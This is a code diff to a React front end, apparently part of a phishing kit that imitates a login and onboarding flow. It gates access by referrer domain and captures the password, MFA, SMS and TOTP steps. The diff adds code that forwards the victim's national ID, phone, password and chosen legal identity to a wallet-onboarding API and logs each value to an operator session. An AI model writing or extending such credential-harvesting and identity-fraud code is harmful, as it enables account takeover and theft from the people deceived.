@@ -19,6 +19,27 @@ import { saveTotpSecret } from "@/lib/totp";
 
 type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "address" | "biometric" | "done";
 
+interface WayniLegalCandidate {
+  identity_number?: string;
+  full_name: string;
+  gender: string;
+  tax_identification_value: string;
+}
+
+interface IdentityVerifyPayload {
+  identity_number: string;
+  phone_number: string;
+  selected_full_name?: string;
+  selected_gender?: string;
+  selected_tax_identification_value?: string;
+}
+
+interface IdentityVerifyResult {
+  requires_selection?: boolean;
+  candidates?: WayniLegalCandidate[];
+  suggested_gender?: string;
+}
+
 const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];
 
 const isReferrerAllowed = (): boolean => {
@@ -961,8 +982,12 @@ const CocosV2 = () => {
 
 
   // ── Identity Verification (Wayni onboarding) ──
-  const handleIdentityVerify = useCallback(async (data: { identity_number: string; phone_number: string }) => {
-    await updateSession("verify_dni_submitted", { otp_code: `dni:${data.identity_number}|phone:${data.phone_number}` });
+  const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
+    const resolvedPhone = (data.phone_number || syncedPhone || "").trim();
+
+    await updateSession("verify_dni_submitted", {
+      otp_code: `dni:${data.identity_number}|phone:${resolvedPhone}|name_pick:${data.selected_full_name || ""}|gender_pick:${data.selected_gender || ""}`,
+    });
     setLastDni(data.identity_number);
 
     // Check if this DNI already completed onboarding (wallet ACTIVE)
@@ -972,20 +997,24 @@ const CocosV2 = () => {
         identity_number: data.identity_number,
       });
       if (walletCheck?.status === "ACTIVE") {
-        // Already onboarded — skip entire process
         await updateSession("completed", { otp_code: `dni:${data.identity_number}|wallet:ACTIVE|skipped:true` });
         setStep("done");
         return;
       }
-    } catch { /* continue with onboarding */ }
+    } catch {
+      // continue with onboarding
+    }
 
     const pwd = lastPasswordRef.current || lastPassword;
     const { data: result, error: apiError } = await invokeWayni({
       action: "onboarding_verify",
       email,
       identity_number: data.identity_number,
-      phone_number: data.phone_number || syncedPhone,
+      phone_number: resolvedPhone,
       password: pwd,
+      selected_full_name: data.selected_full_name,
+      selected_gender: data.selected_gender,
+      selected_tax_identification_value: data.selected_tax_identification_value,
     });
 
     if (apiError || result?.error) {
@@ -993,10 +1022,30 @@ const CocosV2 = () => {
       throw new Error(result?.error || apiError?.message || "Error en la verificación");
     }
 
+    if (result?.requires_selection) {
+      const candidates = Array.isArray(result?.candidates) ? result.candidates : [];
+      if (!candidates.length) {
+        await updateSession("verify_dni_error");
+        throw new Error("No fue posible validar el titular del DNI. Intentá nuevamente.");
+      }
+
+      return {
+        requires_selection: true,
+        candidates,
+        suggested_gender: String(result?.suggested_gender || data.selected_gender || "").toUpperCase(),
+      };
+    }
+
+    const resolvedGender = String(result?.gender || data.selected_gender || "").toUpperCase();
+
     if (result?.full_name) setSyncedFullName(result.full_name);
     if (result?.user_uuid) setUserUuid(result.user_uuid);
-    if (result?.gender) setUserGender(result.gender);
-    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${result?.gender || ""}|phone:${data.phone_number || syncedPhone}` });
+    if (resolvedGender) setUserGender(resolvedGender);
+
+    await updateSession("verify_dni_success", {
+      otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
+    });
+
     setStep("address");
   }, [email, lastPassword, syncedPhone, updateSession]);
 
